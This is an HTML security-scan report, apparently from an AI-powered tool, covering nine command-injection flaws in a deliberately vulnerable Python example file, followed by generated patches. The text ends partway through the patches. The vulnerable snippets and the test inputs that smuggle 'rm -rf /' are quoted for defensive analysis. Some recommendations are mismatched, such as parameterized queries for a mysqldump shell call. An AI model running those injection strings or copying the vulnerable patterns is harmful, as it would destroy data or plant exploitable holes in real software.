
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VulnDetective Report - examples/command_injection_vulnerable.py</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #fff;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        .header h1 {
            font-size: 3em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        .header .subtitle {
            opacity: 0.9;
            font-size: 1.2em;
        }
        .header .badge {
            display: inline-block;
            background: rgba(255,255,255,0.2);
            padding: 8px 16px;
            border-radius: 20px;
            margin: 10px 5px;
            font-size: 0.9em;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: #f8f9fa;
        }
        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            text-align: center;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0,0,0,0.2);
        }
        .stat-card .number {
            font-size: 3em;
            font-weight: bold;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        .stat-card .label {
            color: #666;
            font-size: 0.95em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .chart-section {
            padding: 30px;
            background: white;
        }
        .chart-container {
            position: relative;
            height: 300px;
            margin-bottom: 30px;
        }
        .section {
            padding: 30px;
            border-top: 1px solid #eee;
        }
        .section h2 {
            color: #667eea;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 3px solid #667eea;
            font-size: 2em;
        }
        .vulnerability {
            border-left: 5px solid #667eea;
            padding: 20px;
            margin-bottom: 20px;
            background: linear-gradient(to right, #f9f9f9 0%, #ffffff 100%);
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            transition: all 0.3s;
        }
        .vulnerability:hover {
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            transform: translateX(5px);
        }
        .vulnerability.critical { border-left-color: #dc2626; }
        .vulnerability.high { border-left-color: #ea580c; }
        .vulnerability.medium { border-left-color: #facc15; }
        .vulnerability.low { border-left-color: #3b82f6; }
        .vulnerability-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .vulnerability-title {
            font-size: 1.4em;
            font-weight: bold;
            color: #333;
        }
        .severity-badge {
            padding: 8px 20px;
            border-radius: 25px;
            color: white;
            font-weight: bold;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        .severity-critical { background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%); }
        .severity-high { background: linear-gradient(135deg, #ea580c 0%, #c2410c 100%); }
        .severity-medium { background: linear-gradient(135deg, #facc15 0%, #eab308 100%); color: #333; }
        .severity-low { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); }
        .vulnerability-meta {
            display: flex;
            gap: 20px;
            color: #666;
            font-size: 0.95em;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        .meta-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .meta-item .icon {
            font-weight: bold;
        }
        .cvss-score {
            display: inline-block;
            padding: 5px 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 15px;
            font-weight: bold;
            font-size: 0.9em;
        }
        .risk-score {
            display: inline-block;
            padding: 5px 12px;
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            color: white;
            border-radius: 15px;
            font-weight: bold;
            font-size: 0.9em;
        }
        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', Consolas, monospace;
            font-size: 0.9em;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.3);
        }
        .code-block pre {
            margin: 0;
        }
        .exploit, .patch {
            margin-top: 25px;
            padding: 20px;
            background: #f0f9ff;
            border-radius: 10px;
            border: 2px solid #bae6fd;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .exploit h3, .patch h3 {
            color: #0c4a6e;
            margin-bottom: 15px;
        }
        .patch {
            background: #f0fdf4;
            border-color: #bbf7d0;
        }
        .patch h3 {
            color: #14532d;
        }
        .footer {
            text-align: center;
            padding: 30px;
            background: #f8f9fa;
            color: #666;
            font-size: 0.95em;
        }
        .confidence-bar {
            height: 8px;
            background: #e0e0e0;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 8px;
        }
        .confidence-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            transition: width 0.5s ease;
            border-radius: 4px;
        }
        .timeline {
            position: relative;
            padding-left: 30px;
            margin-top: 20px;
        }
        .timeline::before {
            content: '';
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 3px;
            background: linear-gradient(180deg, #667eea 0%, #764ba2 100%);
        }
        .timeline-item {
            margin-bottom: 20px;
            padding: 15px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        @media print {
            .container { box-shadow: none; }
            .vulnerability:hover { transform: none; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîç VulnDetective Report</h1>
            <div class="subtitle">
                Advanced AI-Powered Security Analysis
            </div>
            <div style="margin-top: 20px;">
                <span class="badge">üìÅ examples/command_injection_vulnerable.py</span>
                <span class="badge">üìÖ 2025-10-31 21:02:11</span>
                <span class="badge">üíª python</span>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="number">9</div>
                <div class="label">Total Vulnerabilities</div>
            </div>
            <div class="stat-card">
                <div class="number" style="color: #dc2626;">9</div>
                <div class="label">Critical</div>
            </div>
            <div class="stat-card">
                <div class="number" style="color: #ea580c;">0</div>
                <div class="label">High Severity</div>
            </div>
            <div class="stat-card">
                <div class="number">8.7</div>
                <div class="label">Avg CVSS Score</div>
            </div>
            <div class="stat-card">
                <div class="number">0</div>
                <div class="label">Exploits Generated</div>
            </div>
            <div class="stat-card">
                <div class="number">9</div>
                <div class="label">Patches Available</div>
            </div>
        </div>

        <!-- Charts Section -->
        <div class="chart-section">
            <h2>üìä Visual Analytics</h2>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-bottom: 30px;">
                <div>
                    <h3 style="text-align: center; margin-bottom: 15px;">Severity Distribution</h3>
                    <div class="chart-container">
                        <canvas id="severityChart"></canvas>
                    </div>
                </div>
                <div>
                    <h3 style="text-align: center; margin-bottom: 15px;">Vulnerability Types</h3>
                    <div class="chart-container">
                        <canvas id="typeChart"></canvas>
                    </div>
                </div>
            </div>

            <div style="margin-bottom: 30px;">
                <h3 style="text-align: center; margin-bottom: 15px;">CVSS Score Distribution</h3>
                <div class="chart-container">
                    <canvas id="cvssChart"></canvas>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>‚ö†Ô∏è Detected Vulnerabilities</h2>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">1. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 12</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> Directly passing user input to os.system() allows for arbitrary command execution.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>os.system(command)</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> An attacker can append shell commands to the 'hostname' parameter.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Use subprocess.run() with a list of arguments instead of shell=True, and avoid directly including user input in command strings.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">2. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 16</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> Using subprocess.run with shell=True and including user input in the command can lead to command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>subprocess.run(command, shell=True, capture_output=True)</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> An attacker can inject additional shell commands via the 'filename' parameter.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Avoid using shell=True, or ensure user input is properly sanitized and validated.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">3. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 32</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> Executing shell commands with os.system() and unsanitized user input allows command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>os.system(f"ls -la {directory}")</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> An attacker can append commands to the 'directory' parameter.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Use os.listdir() for listing directory contents without executing shell commands.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">4. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 40</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> Command injection vulnerability due to unsanitized input passed to os.system() for grep command.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>os.system(command)</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> Appending shell commands to 'search_term' parameter allows arbitrary command execution.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Use Python's built-in file handling to search within files instead of shell commands.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">5. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 47</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> Unsanitized user input in tar command executed via os.system() leads to command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>os.system(f"tar -czf {output} {filename}")</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> Injecting shell commands through 'filename' or 'output' parameters.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Use tarfile module for handling tar operations in a secure manner.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">6. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 63</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> Command injection possible through unsanitized 'username' input in id command.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>subprocess.check_output(command, shell=True)</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> An attacker can inject commands via the 'username' parameter.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Avoid shell=True and validate or sanitize user inputs.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">7. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 71</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> wget command executed with user-controlled input allows for command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>os.system(f"wget {url} -O {destination}")</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> Appending additional shell commands to 'url' or 'destination' parameters.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Use libraries like requests for downloading files instead of shell commands.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">8. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 120</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> mysqldump command with unsanitized input allows for command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>os.system(command)</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> Injecting additional commands through 'db_name' or 'backup_path' parameters.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Use parameterized queries or ORM libraries for database interactions.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
            <div class="vulnerability critical">
                <div class="vulnerability-header">
                    <div class="vulnerability-title">9. Command Injection</div>
                    <span class="severity-badge severity-critical">
                        Critical
                    </span>
                </div>

                <div class="vulnerability-meta">
                    <div class="meta-item">
                        <span class="icon">üìç</span>
                        <span>Line 135</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üîñ</span>
                        <span>CWE-77</span>
                    </div>
                    <div class="meta-item">
                        <span class="icon">üéØ</span>
                        <span>Confidence: 100%</span>
                    </div>
                    
                    <div class="meta-item">
                        <span class="cvss-score">CVSS: 8.7</span>
                    </div>
                    
                    
                    <div class="meta-item">
                        <span class="risk-score">Risk: 8.7</span>
                    </div>
                    
                </div>

                <div class="confidence-bar">
                    <div class="confidence-fill" style="width: 100.0%"></div>
                </div>

                <p style="margin: 15px 0;"><strong>üìù Description:</strong> Image processing command executed with shell=True and unsanitized input.</p>

                
                <p style="margin-top: 15px;"><strong>üíª Vulnerable Code:</strong></p>
                <div class="code-block"><pre>subprocess.run(command, shell=True)</pre></div>
                

                <p style="margin-top: 15px;"><strong>üí£ Exploitability:</strong> An attacker can append shell commands to 'image_path' or 'output_path'.</p>
                <p style="margin-top: 10px;"><strong>‚úÖ Recommendation:</strong> Use dedicated libraries for image processing tasks, such as PIL or OpenCV.</p>

                
                <details style="margin-top: 15px;">
                    <summary style="cursor: pointer; color: #667eea; font-weight: bold;">üî¨ CVSS Details</summary>
                    <div style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
                        <p><strong>Vector String:</strong> CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</p>
                        <p><strong>Exploitability:</strong> 2.8</p>
                        <p><strong>Impact:</strong> 5.9</p>
                        <p><strong>Attack Vector:</strong> NETWORK</p>
                        <p><strong>Attack Complexity:</strong> LOW</p>
                    </div>
                </details>
                
            </div>
            
        </div>

        

        
        <div class="section">
            <h2>üîß Generated Patches</h2>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to avoid passing user input directly to the `os.system()` function. Instead, we will use `subprocess.run()` with a list of arguments, which does not invoke a shell by default. This will prevent command injection attacks.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>"""
This code demonstrates command injection vulnerabilities in Python
"""

import os
import subprocess


def ping_host(hostname):
    """
    VULNERABLE: Command injection via os.system()
    User input is directly passed to shell
    """
    command = f"ping -c 4 {hostname}"
    os.system(command)  # VULNERABLE: Executes in shell


def check_file_exists(filename):
    """
    VULNERABLE: Command injection via subprocess with shell=True
    """</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>"""
This code demonstrates a secure way to execute system commands in Python
"""

import subprocess


def ping_host(hostname):
    """
    SECURE: No command injection via subprocess.run()
    User input is not directly passed to shell
    """
    command = ["ping", "-c", "4", hostname]
    subprocess.run(command, check=True)  # SECURE: Does not execute in shell</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> The fix works by using `subprocess.run()` instead of `os.system()`. The `subprocess.run()` function is safer because it does not invoke a shell by default, and it takes a list of arguments instead of a single string. This means that even if the user input includes shell metacharacters or additional commands, they will not be interpreted as such, but instead will be treated as part of the argument to the `ping` command.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test with a valid hostname
ping_host("localhost")

# Test with an invalid hostname
try:
    ping_host("invalid_hostname")
except subprocess.CalledProcessError:
    print("Invalid hostname handled correctly")

# Test with a command injection attempt
try:
    ping_host("localhost; rm -rf /")
except subprocess.CalledProcessError:
    print("Command injection attempt handled correctly")</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Validate user input: Ensure that the hostname provided by the user is a valid hostname before passing it to the `ping_host` function.
- Limit privileges: Run the application with the least privileges necessary to perform its function. This can limit the damage caused by a successful command injection attack.
- Use a web application firewall (WAF): A WAF can help detect and block command injection attacks.</p>
                
            </div>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to avoid using shell=True and to sanitize user input. We will use the subprocess.run() function without shell=True and pass the command and its arguments as a list. This will prevent the shell from interpreting special characters which could lead to command injection. We will also add input validation to ensure that the user input is a valid hostname or filename.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>import subprocess


def ping_host(hostname):
    """
    VULNERABLE: Command injection via os.system()
    User input is directly passed to shell
    """
    command = f"ping -c 4 {hostname}"
    os.system(command)  # VULNERABLE: Executes in shell


def check_file_exists(filename):
    """
    VULNERABLE: Command injection via subprocess with shell=True
    """
    command = f"test -f {filename} && echo 'exists' || echo 'not found'"
    result = subprocess.run(command, shell=True, capture_output=True)  # VULNERABLE
    return result.stdout.decode()</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>import subprocess
import os
import re


def validate_input(input_string, pattern):
    if not re.match(pattern, input_string):
        raise ValueError('Invalid input')


def ping_host(hostname):
    """
    FIXED: Command injection via os.system()
    User input is directly passed to shell
    """
    validate_input(hostname, r'^[a-zA-Z0-9.-]+$')
    command = ['ping', '-c', '4', hostname]
    subprocess.run(command)  # FIXED: Executes without shell


def check_file_exists(filename):
    """
    FIXED: Command injection via subprocess with shell=True
    """
    validate_input(filename, r'^[\w\.-]+$')
    command = ['test', '-f', filename]
    result = subprocess.run(command, capture_output=True)  # FIXED
    return 'exists' if result.returncode == 0 else 'not found'</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> The fixed code works by passing the command and its arguments as a list to subprocess.run(), which prevents the shell from interpreting special characters. This eliminates the command injection vulnerability. The code also validates the user input to ensure that it is a valid hostname or filename. This prevents the user from entering malicious input.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test ping_host function
ping_host('localhost')  # Should ping localhost
ping_host('google.com')  # Should ping google.com
ping_host('invalid;rm -rf /')  # Should raise ValueError: Invalid input

# Test check_file_exists function
check_file_exists('existing_file.txt')  # Should return 'exists'
check_file_exists('non_existing_file.txt')  # Should return 'not found'
check_file_exists('invalid;rm -rf /')  # Should raise ValueError: Invalid input</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Use a library or framework that automatically escapes shell commands.
- Use a least privilege policy on the system where the code runs. This will limit the damage that can be done if a command injection vulnerability is exploited.
- Regularly update and patch all systems to fix known vulnerabilities.
- Use static code analysis tools to automatically detect potential vulnerabilities.
- Train developers on secure coding practices.</p>
                
            </div>
            
            <div class="patch">
